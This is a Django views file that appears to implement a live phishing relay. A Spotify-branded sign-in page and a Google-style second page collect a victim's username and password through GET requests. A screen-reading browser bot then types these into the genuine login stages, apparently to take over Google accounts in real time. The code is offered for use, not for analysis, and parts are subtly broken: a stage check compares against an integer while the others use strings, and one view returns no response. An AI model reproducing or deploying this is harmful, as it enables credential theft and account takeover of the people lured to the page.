from django.http import HttpResponse, HttpRequest, HttpResponseRedirect
from django.template import loader
from .models import *
from .cvBrowser import CVBrowser


browser = None

def signin(request):
    template = loader.get_template("signin.html")
    context = {
        "site": "Spotify",
    }
    return HttpResponse(template.render(context=context, request=request))

def username(request):
    global browser
    browser = CVBrowser()
    if request.GET:
        username = request.GET["username"]
        #User_dtl(username=username, type="google").save()
        print("start")
        while True:
            img = browser.grabImg()
            text = browser.analyze(img)
            stg = browser.detect_stage(text)
            print(stg, username)
            if stg =="1":
                if browser.action(text, stg, username):
                    break
        print("saved")
        #x = Stage.objects.filter(status="idle")
        #User_dtl.objects.filter(username=username).update(x.first().machine_id)
        #x.filter(machine_id=x.first().machine_id).update("full")
        return HttpResponse(username, content_type="text/plain")
    else: return HttpResponse("-1", content_type="text/plain") 

def password(request):
    if request.GET:
        password = request.GET["password"]
        while True:
            img = browser.grabImg()
            text = browser.analyze(img)
            stg = browser.detect_stage(text)
            if stg == "2":
                if browser.action(text, stg, password):
                    break
        while True:
            img = browser.grabImg()
            text = browser.analyze(img)
            stg = browser.detect_stage(text)
            if stg == 3:
                if browser.action(text, stg, password):
                    break

def fact2(request):
    template = loader.get_template("google1.html")
    username = request.GET["username"]
    if "@gmail.com" in username:
        pass
    else:
        username += "@gmail.com"
    return HttpResponse(template.render({'user': username}, request,))

def index(request):
    template = loader.get_template("index.html")
    return HttpResponse(template.render())